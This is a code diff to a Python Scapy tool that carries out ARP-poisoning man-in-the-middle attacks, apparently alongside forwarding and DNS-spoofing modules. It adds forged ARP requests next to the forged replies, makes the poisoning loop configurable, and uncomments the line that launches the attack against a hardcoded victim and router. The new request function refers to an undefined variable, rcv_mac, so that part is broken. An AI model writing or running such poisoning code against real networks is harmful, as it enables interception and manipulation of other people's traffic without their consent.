@@ -2,8 +2,9 @@ from scapy.all import *
 from Forward import *
 from DNS import *
 import threading
+from config import config
 
-def forge_arp_response(rcv_ip, rcv_mac, res_ip, res_mac):
+def forge_arp_reply(rcv_ip, rcv_mac, res_ip, res_mac):
 	return Ether(dst=rcv_mac) / ARP(
 		op=2,
 		psrc=res_ip,
@@ -11,24 +12,52 @@ def forge_arp_response(rcv_ip, rcv_mac, res_ip, res_mac):
 		hwsrc=res_mac,
 		hwdst=rcv_mac
 	)
+
+def forge_arp_request(src_ip, src_mac, target_ip):
+	return Ether(dst=rcv_mac) / ARP(
+		op=1,
+		psrc=src_ip,
+		hwsrc=src_mac,
+		pdst=target_ip,
+    	hwdst="00:00:00:00:00:00"
+	)
 	
-def poison_loop(packets, interface, interval):
+def poison_loop(forged_replies, forged_requests, interface):
+	i = 1
 	# Repeatedly sends each forged response at once and then sleeps for [interval] seconds
 	while True:
-		sendp(packets, iface=interface)
-		time.sleep(interval)
+		#if (config.arp_poison_icmp):
+			# send a spoofed icmp echo request
+		if (config.arp_poison_reply):
+			sendp(forged_replies, iface=interface)
+		if (config.arp_poison_request):
+			sendp(forged_requests, iface=interface)
+
+		# For the first 5 poison batches use the warm up delay
+		if i < 5:
+			time.sleep(config.arp_poison_warm_up)
+		else:
+			time.sleep(config.arp_poison_delay)
+		i += 1
 	
 def start_arp_mitm(victims, self_mac, interface):
 	# create a list of each forged response,
 	# so each victim gets all other victims spoofed with the mac of this device
-	forged_responses = [
-		forge_arp_response(ip1, mac1, ip2, self_mac)
+	forged_replies = [
+		forge_arp_reply(ip1, mac1, ip2, self_mac)
 		for (ip1, mac1) in victims
 		for (ip2, mac2) in victims
 		if (ip1, mac1) != (ip2, mac2)
 	]
 
-	thread = threading.Thread(target=poison_loop, args=(forged_responses, interface, 20), daemon=True) # todo add ways to customise intervals / interfaces
+	forged_requests = [
+		forge_arp_request(ip1, self_mac, ip2)
+		for (ip1, mac1) in victims
+		for (ip2, mac2) in victims
+		if (ip1, mac1) != (ip2, mac2)
+	]
+
+	thread = threading.Thread(target=poison_loop, args=(forged_replies, forged_requests, interface), daemon=True)
 
 	thread.start()
 
@@ -75,4 +104,4 @@ interface = "eth0"
 victims = [(victim_ip, victim_mac), (router_ip, router_mac)]
 
 # start the attack with the placeholder values to avoid having to go through discovery every time for testing
-# start_attack(victims, self_ip, self_mac, interface)
+start_attack(victims, self_ip, self_mac, interface)
